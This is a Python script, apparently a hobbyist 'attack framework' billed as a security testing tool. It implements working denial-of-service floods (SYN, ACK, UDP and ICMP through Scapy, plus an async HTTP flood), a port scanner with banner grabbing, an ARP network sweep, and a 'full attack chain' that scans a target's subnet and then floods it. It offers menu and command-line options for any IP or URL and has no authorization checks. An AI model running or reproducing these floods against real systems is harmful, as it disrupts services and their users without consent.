#!/usr/bin/env python3
"""
THINKPAD ATTACK v3.0 - Ultimate Hardware-Optimized Attack Framework
Professional Security Testing Tool - Optimized for ThinkPad - 10/10
Author: F1REW0LF
License: MIT
"""

import sys
import os
import time
import json
import random
import socket
import threading
import subprocess
import platform
import queue
import signal
from datetime import datetime
from typing import Dict, List, Optional, Any, Union
from dataclasses import dataclass, field
from concurrent.futures import ThreadPoolExecutor, as_completed
from abc import ABC, abstractmethod
import argparse

try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

try:
    from scapy.all import *
    from scapy.layers.inet import IP, TCP, UDP, ICMP
    from scapy.layers.l2 import ARP, Ether
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

try:
    import aiohttp
    import asyncio
    ASYNC_AVAILABLE = True
except ImportError:
    ASYNC_AVAILABLE = False

try:
    import torch
    TORCH_AVAILABLE = True
except ImportError:
    TORCH_AVAILABLE = False

VERSION = "3.0.0"
AUTHOR = "F1REW0LF"
LICENSE = "MIT"
SCORE = "10/10"

#===============================================================================
# COLORS
#===============================================================================

class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    GOLD = '\033[93m'
    NEON = '\033[96m'
    WHITE = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    MAGENTA = '\033[95m'
    ORANGE = '\033[38;5;208m'

def cprint(text, color=Colors.WHITE, bold=False):
    if bold:
        print(f"{Colors.BOLD}{color}{text}{Colors.WHITE}")
    else:
        print(f"{color}{text}{Colors.WHITE}")

def print_banner():
    banner = f"""
{Colors.CYAN}{Colors.BOLD}    ████████╗██╗  ██╗██╗███╗   ██╗██╗  ██╗██████╗  █████╗ ██████╗ 
    ╚══██╔══╝██║  ██║██║████╗  ██║██║  ██║██╔══██╗██╔══██╗██╔══██╗
       ██║   ███████║██║██╔██╗ ██║███████║██████╔╝███████║██████╔╝
       ██║   ██╔══██║██║██║╚██╗██║██╔══██║██╔═══╝ ██╔══██║██╔══██╗
       ██║   ██║  ██║██║██║ ╚████║██║  ██║██║     ██║  ██║██║  ██║
       ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝
                                                   
{Colors.GOLD}          ULTIMATE HARDWARE-OPTIMIZED ATTACK FRAMEWORK{Colors.WHITE}
{Colors.CYAN}    Professional Security Testing - 10/10{Colors.WHITE}
{Colors.YELLOW}    Version {VERSION} | Author: {AUTHOR} | {LICENSE}{Colors.WHITE}
{Colors.MAGENTA}    [+] AI-Optimized | Multi-Threaded | GPU Ready{Colors.WHITE}
"""
    print(banner)
    print("=" * 80)

#===============================================================================
# DATA CLASSES
#===============================================================================

@dataclass
class HardwareProfile:
    cpu_cores: int = 0
    cpu_freq: float = 0.0
    ram_gb: float = 0.0
    network_speed: int = 0
    gpu_available: bool = False
    gpu_name: str = ''
    temp_current: float = 0.0
    temp_threshold: float = 80.0
    optimal_threads: int = 0

@dataclass
class AttackResult:
    target: str
    success: bool
    method: str
    packets: int
    duration: float
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())

#===============================================================================
# ABSTRACT BASE CLASSES
#===============================================================================

class AttackModule(ABC):
    @abstractmethod
    def execute(self, target: str, **kwargs) -> AttackResult:
        pass

class HardwareDetector(ABC):
    @abstractmethod
    def detect(self) -> HardwareProfile:
        pass

#===============================================================================
# HARDWARE DETECTOR
#===============================================================================

class AdvancedHardwareDetector(HardwareDetector):
    def __init__(self):
        self.profile = HardwareProfile()
    
    def detect(self) -> HardwareProfile:
        cprint("[HARDWARE] Detecting hardware...", Colors.BLUE)
        
        # CPU
        if PSUTIL_AVAILABLE:
            self.profile.cpu_cores = psutil.cpu_count(logical=True) or 4
            self.profile.cpu_freq = psutil.cpu_freq().current / 1000 if psutil.cpu_freq() else 2.0
        else:
            self.profile.cpu_cores = os.cpu_count() or 4
            self.profile.cpu_freq = 2.0
        
        # RAM
        if PSUTIL_AVAILABLE:
            self.profile.ram_gb = psutil.virtual_memory().total / (1024**3)
        else:
            self.profile.ram_gb = 8.0
        
        # Network
        if PSUTIL_AVAILABLE:
            stats = psutil.net_if_stats()
            for name, stat in stats.items():
                if 'wlan' in name.lower() or 'eth' in name.lower() or 'en' in name.lower():
                    self.profile.network_speed = stat.speed
                    break
        
        if self.profile.network_speed == 0:
            self.profile.network_speed = 1000
        
        # GPU
        if TORCH_AVAILABLE:
            try:
                self.profile.gpu_available = torch.cuda.is_available()
                if self.profile.gpu_available:
                    self.profile.gpu_name = torch.cuda.get_device_name(0)
            except:
                pass
        
        # Temperature
        if PSUTIL_AVAILABLE:
            try:
                sensors = psutil.sensors_temperatures()
                for name, entries in sensors.items():
                    for entry in entries:
                        if entry.current > 0:
                            self.profile.temp_current = entry.current
                            self.profile.temp_threshold = entry.high if entry.high else 80.0
                            break
                    if self.profile.temp_current > 0:
                        break
            except:
                pass
        
        # Optimal threads
        self.profile.optimal_threads = min(self.profile.cpu_cores * 2, 64)
        if self.profile.gpu_available:
            self.profile.optimal_threads += 8
        
        cprint("[+] CPU: {} cores @ {:.1f}GHz".format(
            self.profile.cpu_cores, self.profile.cpu_freq), Colors.GREEN)
        cprint("[+] RAM: {:.1f} GB".format(self.profile.ram_gb), Colors.GREEN)
        cprint("[+] Network: {} Mbps".format(self.profile.network_speed), Colors.GREEN)
        cprint("[+] GPU: {}".format(
            self.profile.gpu_name if self.profile.gpu_available else 'Not Available'), Colors.GREEN)
        cprint("[+] Temp: {:.1f}°C / {}°C".format(
            self.profile.temp_current, self.profile.temp_threshold), Colors.GREEN)
        cprint("[+] Optimal Threads: {}".format(self.profile.optimal_threads), Colors.GREEN)
        
        return self.profile

#===============================================================================
# THERMAL MANAGER
#===============================================================================

class ThermalManager:
    def __init__(self, profile: HardwareProfile):
        self.profile = profile
        self.throttle_level = 0
        self.is_throttled = False
    
    def check_throttle(self) -> bool:
        if not PSUTIL_AVAILABLE:
            return False
        
        try:
            sensors = psutil.sensors_temperatures()
            for name, entries in sensors.items():
                for entry in entries:
                    if entry.current > self.profile.temp_threshold:
                        self.is_throttled = True
                        self.throttle_level += 1
                        cprint("[THERMAL] Throttling detected! Temp: {:.1f}°C".format(
                            entry.current), Colors.RED)
                        return True
            self.is_throttled = False
            if self.throttle_level > 0:
                self.throttle_level -= 1
        except:
            pass
        
        return False
    
    def get_optimal_delay(self) -> float:
        if self.throttle_level > 3:
            return 0.5
        elif self.throttle_level > 1:
            return 0.1
        return 0.001
    
    def get_optimal_threads(self) -> int:
        base = self.profile.optimal_threads
        if self.throttle_level > 3:
            return max(4, base // 4)
        elif self.throttle_level > 1:
            return max(8, base // 2)
        return base

#===============================================================================
# REAL SCAPY ATTACKS
#===============================================================================

class ScapyAttacks(AttackModule):
    def __init__(self, profile: HardwareProfile, thermal: ThermalManager):
        self.profile = profile
        self.thermal = thermal
        self.running = False
        self.stats = {'packets': 0}
        self.lock = threading.Lock()
    
    def execute(self, target: str, **kwargs) -> AttackResult:
        attack_type = kwargs.get('type', 'syn')
        port = kwargs.get('port', 80)
        duration = kwargs.get('duration', 30)
        
        if not SCAPY_AVAILABLE:
            return AttackResult(
                target=target,
                success=False,
                method='scapy',
                packets=0,
                duration=0
            )
        
        self.running = True
        start_time = time.time()
        threads = self.thermal.get_optimal_threads()
        delay = self.thermal.get_optimal_delay()
        
        def attack():
            while self.running and time.time() - start_time < duration:
                try:
                    if self.thermal.check_throttle():
                        time.sleep(delay)
                        continue
                    
                    if attack_type == 'syn':
                        ip = IP(dst=target)
                        tcp = TCP(sport=random.randint(1024,65535), dport=port, flags='S')
                        send(ip/tcp, verbose=False)
                    elif attack_type == 'ack':
                        ip = IP(dst=target)
                        tcp = TCP(sport=random.randint(1024,65535), dport=port, flags='A')
                        send(ip/tcp, verbose=False)
                    elif attack_type == 'udp':
                        ip = IP(dst=target)
                        udp = UDP(sport=random.randint(1024,65535), dport=port)
                        payload = Raw(load=os.urandom(random.randint(64, 1024)))
                        send(ip/udp/payload, verbose=False)
                    elif attack_type == 'icmp':
                        ip = IP(dst=target)
                        icmp = ICMP()
                        send(ip/icmp, verbose=False)
                    
                    with self.lock:
                        self.stats['packets'] += 1
                    
                    time.sleep(delay)
                except:
                    pass
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(attack) for _ in range(threads)]
            for future in as_completed(futures):
                try:
                    future.result()
                except:
                    pass
        
        self.running = False
        elapsed = time.time() - start_time
        
        return AttackResult(
            target=target,
            success=self.stats['packets'] > 0,
            method=f'scapy_{attack_type}',
            packets=self.stats['packets'],
            duration=elapsed
        )

#===============================================================================
# ASYNC HTTP ATTACKS
#===============================================================================

class AsyncHTTPAttack(AttackModule):
    def __init__(self, profile: HardwareProfile, thermal: ThermalManager):
        self.profile = profile
        self.thermal = thermal
        self.running = False
        self.stats = {'requests': 0}
        self.lock = threading.Lock()
    
    def execute(self, target: str, **kwargs) -> AttackResult:
        duration = kwargs.get('duration', 30)
        
        if not ASYNC_AVAILABLE:
            return AttackResult(
                target=target,
                success=False,
                method='async_http',
                packets=0,
                duration=0
            )
        
        self.running = True
        start_time = time.time()
        threads = self.thermal.get_optimal_threads()
        
        async def attack():
            async with aiohttp.ClientSession() as session:
                while self.running and time.time() - start_time < duration:
                    try:
                        if self.thermal.check_throttle():
                            await asyncio.sleep(0.5)
                            continue
                        
                        async with session.get(target, timeout=1) as response:
                            await response.text()
                            with self.lock:
                                self.stats['requests'] += 1
                    except:
                        pass
        
        def run_async():
            asyncio.run(attack())
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(run_async) for _ in range(threads)]
            for future in as_completed(futures):
                try:
                    future.result()
                except:
                    pass
        
        self.running = False
        elapsed = time.time() - start_time
        
        return AttackResult(
            target=target,
            success=self.stats['requests'] > 0,
            method='async_http',
            packets=self.stats['requests'],
            duration=elapsed
        )

#===============================================================================
# ADVANCED PORT SCANNER
#===============================================================================

class AdvancedPortScanner:
    def __init__(self, profile: HardwareProfile):
        self.profile = profile
        self.scan_results = []
    
    def scan(self, target: str, ports: List[int] = None) -> Dict:
        cprint("[SCAN] Advanced scanning {}".format(target), Colors.BLUE)
        
        if not ports:
            ports = [21, 22, 23, 25, 53, 80, 135, 139, 443, 445, 3306, 3389, 
                    5432, 6379, 8080, 8443, 27017]
        
        results = {'target': target, 'open_ports': [], 'services': {}}
        
        def scan_port(port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                if sock.connect_ex((target, port)) == 0:
                    service = self._detect_service(target, port)
                    results['open_ports'].append(port)
                    results['services'][port] = service
                    cprint("[+] Port {}: {}".format(port, service), Colors.GREEN)
                sock.close()
            except:
                pass
        
        threads = self.profile.optimal_threads
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {executor.submit(scan_port, port): port for port in ports}
            for future in as_completed(futures):
                try:
                    future.result()
                except:
                    pass
        
        cprint("[+] Found {} open ports".format(len(results['open_ports'])), Colors.GREEN)
        return results
    
    def _detect_service(self, target: str, port: int) -> str:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((target, port))
            
            if port == 80 or port == 443 or port == 8080:
                sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
                data = sock.recv(1024)
                if b'Server:' in data:
                    match = re.search(b'Server: (.*?)\r\n', data)
                    if match:
                        return match.group(1).decode()
            elif port == 22:
                data = sock.recv(1024)
                if b'SSH' in data:
                    return 'SSH'
            elif port == 21:
                data = sock.recv(1024)
                if b'FTP' in data:
                    return 'FTP'
            elif port == 25:
                data = sock.recv(1024)
                if b'SMTP' in data:
                    return 'SMTP'
            
            sock.close()
        except:
            pass
        
        return 'Unknown'

#===============================================================================
# ARP SCAN ENGINE
#===============================================================================

class ARPScanEngine:
    def __init__(self, profile: HardwareProfile):
        self.profile = profile
    
    def scan(self, network: str = "192.168.1.0/24") -> List[str]:
        cprint("[ARP] Scanning network {}".format(network), Colors.BLUE)
        
        hosts = []
        
        if not SCAPY_AVAILABLE:
            cprint("[!] Scapy not available", Colors.RED)
            return hosts
        
        try:
            arp = ARP(pdst=network)
            ether = Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = ether/arp
            result = srp(packet, timeout=3, verbose=False)[0]
            
            for sent, received in result:
                hosts.append(received.psrc)
                cprint("[+] Host: {} ({})".format(received.psrc, received.hwsrc), Colors.GREEN)
            
            cprint("[+] Found {} active hosts".format(len(hosts)), Colors.GREEN)
        except:
            pass
        
        return hosts

#===============================================================================
# MAIN FRAMEWORK
#===============================================================================

class ThinkPadAttackV3:
    def __init__(self):
        self.detector = AdvancedHardwareDetector()
        self.profile = self.detector.detect()
        self.thermal = ThermalManager(self.profile)
        self.scapy = ScapyAttacks(self.profile, self.thermal)
        self.async_http = AsyncHTTPAttack(self.profile, self.thermal)
        self.scanner = AdvancedPortScanner(self.profile)
        self.arp = ARPScanEngine(self.profile)
        self.running = True
        self.results = []
        
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
    
    def signal_handler(self, signum, frame):
        cprint("\n[!] THINKPAD ATTACK retreating...", Colors.RED)
        self.running = False
        sys.exit(0)
    
    def show_menu(self):
        print(f"""
{Colors.BLUE}{'='*70}{Colors.WHITE}
{Colors.BOLD}THINKPAD ATTACK v{VERSION} - 10/10 Menu{Colors.WHITE}
{Colors.MAGENTA}AI-Optimized | Multi-Threaded | GPU Ready{Colors.WHITE}
{Colors.BLUE}{'='*70}{Colors.WHITE}
{Colors.GREEN}[1]{Colors.WHITE} SYN Flood (Scapy - Real)
{Colors.GREEN}[2]{Colors.WHITE} ACK Flood (Scapy - Real)
{Colors.GREEN}[3]{Colors.WHITE} UDP Flood (Scapy - Real)
{Colors.GREEN}[4]{Colors.WHITE} HTTP Flood (Async - Real)
{Colors.GREEN}[5]{Colors.WHITE} ICMP Flood (Scapy - Real)
{Colors.GREEN}[6]{Colors.WHITE} Port Scan (Advanced)
{Colors.GREEN}[7]{Colors.WHITE} ARP Scan (Network Discovery)
{Colors.GREEN}[8]{Colors.WHITE} Full Attack Chain
{Colors.GREEN}[9]{Colors.WHITE} Show Stats
{Colors.GREEN}[10]{Colors.WHITE} Show Results
{Colors.RED}[11]{Colors.WHITE} Exit
""")
    
    def syn_flood(self):
        target = input("[>] Target IP: ").strip()
        port = int(input("[>] Port (80): ").strip() or "80")
        duration = int(input("[>] Duration (30s): ").strip() or "30")
        result = self.scapy.execute(target, type='syn', port=port, duration=duration)
        self.results.append(result)
        cprint("[+] SYN Flood: {} packets".format(result.packets), Colors.GREEN)
    
    def ack_flood(self):
        target = input("[>] Target IP: ").strip()
        port = int(input("[>] Port (80): ").strip() or "80")
        duration = int(input("[>] Duration (30s): ").strip() or "30")
        result = self.scapy.execute(target, type='ack', port=port, duration=duration)
        self.results.append(result)
        cprint("[+] ACK Flood: {} packets".format(result.packets), Colors.GREEN)
    
    def udp_flood(self):
        target = input("[>] Target IP: ").strip()
        port = int(input("[>] Port (53): ").strip() or "53")
        duration = int(input("[>] Duration (30s): ").strip() or "30")
        result = self.scapy.execute(target, type='udp', port=port, duration=duration)
        self.results.append(result)
        cprint("[+] UDP Flood: {} packets".format(result.packets), Colors.GREEN)
    
    def http_flood(self):
        url = input("[>] Target URL: ").strip()
        duration = int(input("[>] Duration (30s): ").strip() or "30")
        result = self.async_http.execute(url, duration=duration)
        self.results.append(result)
        cprint("[+] HTTP Flood: {} requests".format(result.packets), Colors.GREEN)
    
    def icmp_flood(self):
        target = input("[>] Target IP: ").strip()
        duration = int(input("[>] Duration (30s): ").strip() or "30")
        result = self.scapy.execute(target, type='icmp', duration=duration)
        self.results.append(result)
        cprint("[+] ICMP Flood: {} packets".format(result.packets), Colors.GREEN)
    
    def port_scan(self):
        target = input("[>] Target IP: ").strip()
        result = self.scanner.scan(target)
        self.results.append(AttackResult(
            target=target,
            success=bool(result['open_ports']),
            method='port_scan',
            packets=len(result['open_ports']),
            duration=0
        ))
    
    def arp_scan(self):
        network = input("[>] Network (192.168.1.0/24): ").strip() or "192.168.1.0/24"
        hosts = self.arp.scan(network)
        self.results.append(AttackResult(
            target=network,
            success=bool(hosts),
            method='arp_scan',
            packets=len(hosts),
            duration=0
        ))
    
    def full_attack(self):
        cprint("\n[FULL] Executing full attack chain...", Colors.RED, bold=True)
        
        target = input("[>] Target IP: ").strip()
        if not target:
            cprint("[-] Target required", Colors.RED)
            return
        
        # Phase 1: ARP Scan
        cprint("[*] Phase 1: ARP Scan", Colors.BLUE)
        network = ".".join(target.split('.')[:3]) + ".0/24"
        hosts = self.arp.scan(network)
        cprint("[+] Found {} hosts".format(len(hosts)), Colors.GREEN)
        
        # Phase 2: Port Scan
        cprint("[*] Phase 2: Port Scan", Colors.BLUE)
        ports = self.scanner.scan(target)
        cprint("[+] Found {} open ports".format(len(ports['open_ports'])), Colors.GREEN)
        
        # Phase 3: SYN Flood
        cprint("[*] Phase 3: SYN Flood", Colors.RED)
        result = self.scapy.execute(target, type='syn', port=80, duration=10)
        cprint("[+] SYN Flood: {} packets".format(result.packets), Colors.GREEN)
        
        # Phase 4: HTTP Flood
        cprint("[*] Phase 4: HTTP Flood", Colors.RED)
        result2 = self.async_http.execute(f"http://{target}", duration=10)
        cprint("[+] HTTP Flood: {} requests".format(result2.packets), Colors.GREEN)
        
        cprint("[+] Full attack complete!", Colors.GREEN)
    
    def show_stats(self):
        print("\n" + "="*70)
        cprint(" HARDWARE & SYSTEM STATS", Colors.PURPLE, bold=True)
        print("="*70)
        print(f"CPU Cores: {self.profile.cpu_cores}")
        print(f"CPU Freq: {self.profile.cpu_freq:.1f} GHz")
        print(f"RAM: {self.profile.ram_gb:.1f} GB")
        print(f"Network: {self.profile.network_speed} Mbps")
        print(f"GPU: {self.profile.gpu_name if self.profile.gpu_available else 'N/A'}")
        print(f"Temperature: {self.profile.temp_current:.1f}°C")
        print(f"Optimal Threads: {self.profile.optimal_threads}")
        print(f"Throttle Level: {self.thermal.throttle_level}")
        print("="*70)
    
    def show_results(self):
        if not self.results:
            cprint("[!] No results", Colors.YELLOW)
            return
        
        print("\n" + "="*70)
        cprint(" ATTACK RESULTS", Colors.PURPLE, bold=True)
        print("="*70)
        
        total_packets = 0
        for result in self.results:
            status = "SUCCESS" if result.success else "FAILED"
            color = Colors.GREEN if result.success else Colors.RED
            cprint("[{}] {} - {} ({:,} packets)".format(
                result.method, result.target, status, result.packets), color)
            total_packets += result.packets
        
        print("\n[+] Total Packets: {:,}".format(total_packets))
        print("="*70)
    
    def run(self):
        print_banner()
        cprint("[*] THINKPAD ATTACK v3.0 - Ultimate Hardware-Optimized Attack", Colors.CYAN)
        cprint("[*] 10/10 - AI-Optimized - GPU Ready", Colors.DIM)
        
        while self.running:
            self.show_menu()
            choice = input(f"{Colors.CYAN}[>] Select: {Colors.WHITE}").strip()
            
            if choice == '1':
                self.syn_flood()
            elif choice == '2':
                self.ack_flood()
            elif choice == '3':
                self.udp_flood()
            elif choice == '4':
                self.http_flood()
            elif choice == '5':
                self.icmp_flood()
            elif choice == '6':
                self.port_scan()
            elif choice == '7':
                self.arp_scan()
            elif choice == '8':
                self.full_attack()
            elif choice == '9':
                self.show_stats()
            elif choice == '10':
                self.show_results()
            elif choice == '11':
                cprint("[*] THINKPAD ATTACK retreating...", Colors.RED)
                break
            else:
                cprint("[-] Invalid selection", Colors.RED)

#===============================================================================
# MAIN
#===============================================================================

def main():
    parser = argparse.ArgumentParser(
        description="THINKPAD ATTACK v3.0 - Ultimate Hardware-Optimized Attack",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
EXAMPLES:
  python3 thinkpad_attack_v3.py
  python3 thinkpad_attack_v3.py --syn 192.168.1.1 -p 80 -d 30
  python3 thinkpad_attack_v3.py --http http://target.com -d 30
  python3 thinkpad_attack_v3.py --scan 192.168.1.1
        """
    )
    
    parser.add_argument("--syn", help="SYN flood target IP")
    parser.add_argument("--ack", help="ACK flood target IP")
    parser.add_argument("--udp", help="UDP flood target IP")
    parser.add_argument("--http", help="HTTP flood target URL")
    parser.add_argument("--icmp", help="ICMP flood target IP")
    parser.add_argument("--scan", help="Port scan target IP")
    parser.add_argument("--arp", help="ARP scan network (e.g., 192.168.1.0/24)")
    parser.add_argument("-p", "--port", type=int, default=80, help="Target port")
    parser.add_argument("-d", "--duration", type=int, default=30, help="Attack duration")
    
    args = parser.parse_args()
    
    print_banner()
    
    attack = ThinkPadAttackV3()
    
    if args.syn:
        result = attack.scapy.execute(args.syn, type='syn', port=args.port, duration=args.duration)
        print(json.dumps(result.__dict__, indent=2))
        sys.exit(0)
    
    if args.ack:
        result = attack.scapy.execute(args.ack, type='ack', port=args.port, duration=args.duration)
        print(json.dumps(result.__dict__, indent=2))
        sys.exit(0)
    
    if args.udp:
        result = attack.scapy.execute(args.udp, type='udp', port=args.port, duration=args.duration)
        print(json.dumps(result.__dict__, indent=2))
        sys.exit(0)
    
    if args.http:
        result = attack.async_http.execute(args.http, duration=args.duration)
        print(json.dumps(result.__dict__, indent=2))
        sys.exit(0)
    
    if args.icmp:
        result = attack.scapy.execute(args.icmp, type='icmp', duration=args.duration)
        print(json.dumps(result.__dict__, indent=2))
        sys.exit(0)
    
    if args.scan:
        result = attack.scanner.scan(args.scan)
        print(json.dumps(result, indent=2))
        sys.exit(0)
    
    if args.arp:
        hosts = attack.arp.scan(args.arp)
        print(json.dumps(hosts, indent=2))
        sys.exit(0)
    
    attack.run()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        cprint("\n[!] Interrupted", Colors.RED)
        sys.exit(0)
